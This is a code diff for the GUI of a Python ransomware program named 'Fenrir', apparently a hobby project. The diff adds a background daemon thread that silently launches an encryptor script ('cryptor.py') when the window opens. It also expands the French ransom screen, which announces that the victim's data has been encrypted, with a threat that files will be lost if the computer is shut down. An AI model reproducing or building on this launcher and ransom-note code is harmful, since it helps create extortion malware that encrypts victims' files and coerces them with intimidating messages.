@@ -7,8 +7,17 @@ from tkinter.ttk import Label
 import os
 import sys
 import time
+from threading import Thread
 
-#os.system('cryptor.pyw')
+class MyThread(Thread):
+    def run(self):
+        os.system('cryptor.py')
+        pass
+
+thread = MyThread()
+thread.daemon = True
+thread.start()
+
 #time.sleep(3)
 
 fenrir = Tk()
@@ -30,7 +39,9 @@ Oups.pack(side=TOP, padx=30, pady=30)
 Label(Oups, text="Woops ! Vos données ont été encryptées par Fenrir !", background="red", foreground="black", font="50").pack(padx=10, pady=10)
 canvas = Canvas(fenrir, width=500, height=500, background='#F0F0F0')
 infos1 = canvas.create_text(170, 12, text="Comment récupérer mes données ?", font="Arial 16", fill="black")
-infos2 = canvas.create_text(183, 40, text="""Et bien c'est très simple, **Générique de Yu-Gi-Oh**""", font="Arial 12", fill="black")
+infos2 = canvas.create_text(215, 60, text="""Et bien c'est très simple, **Générique de Yu-Gi-Oh**
+-------------
+Ne fermez pas votre ordinateur, ou vos fichiers seront perdus.""", font="Arial 12", fill="black")
 canvas.pack()
 
 string = StringVar()
